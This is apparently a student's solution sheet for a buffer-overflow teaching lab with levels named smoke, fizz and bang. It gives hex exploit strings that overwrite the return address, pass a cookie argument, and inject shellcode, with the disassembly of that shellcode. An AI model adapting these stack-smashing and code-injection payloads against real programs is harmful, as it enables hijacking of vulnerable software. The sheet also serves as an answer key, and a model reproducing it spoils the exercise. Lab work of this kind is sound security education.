
Solutions

--------------------------------------

return to smoke -> 0x4010c0

30 30 30 30 30 30 30 30 // overflow buffer
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
b0 b9 ff ff ff 7f 00 00 // main address
c0 10 40 00 00 00 00 00 // smoke address

--------------------------------------

return to fizz -> 0x401070
cookie -> 0x3a925b011dee5154

30 30 30 30 30 30 30 30 // overflow buffer
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 
b0 b9 ff ff ff 7f 00 00 // main address
70 10 40 00 00 00 00 00 // fizz address
00 00 00 00 00 00 00 00 // fizz argument (cookie)
54 51 ee 1d 01 5b 92 3a

--------------------------------------

return to bang -> 0x401020
&global_value -> 0x602308
code injection address -> 0x7fffffffb990

30 30 30 30 30 30 30 30 // overflow buffer
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
b0 b9 ff ff ff 7f 00 00 // main address
90 b9 ff ff ff 7f 00 00 // injection code address
50 48 b8 54 51 ee 1d 01 // injection code
5b 92 3a 48 89 04 25 08
23 60 00 58 68 20 10 40
00 c3 00 00 00 00 00 00

CONVERT ASSEMBLY TO HEX (INJECTION CODE) USING GCC:

0000000000000000 <.text>:
   0:	50                   	push   %rax
   1:	48 b8 54 51 ee 1d 01 	movabs $0x3a925b011dee5154,%rax
   8:	5b 92 3a
   b:	48 89 04 25 08 23 60 	mov    %rax,0x602308
  12:	00
  13:	58                   	pop    %rax
  14:	68 20 10 40 00       	push   $0x401020
  19:	c3                   	ret

----------------------------------------
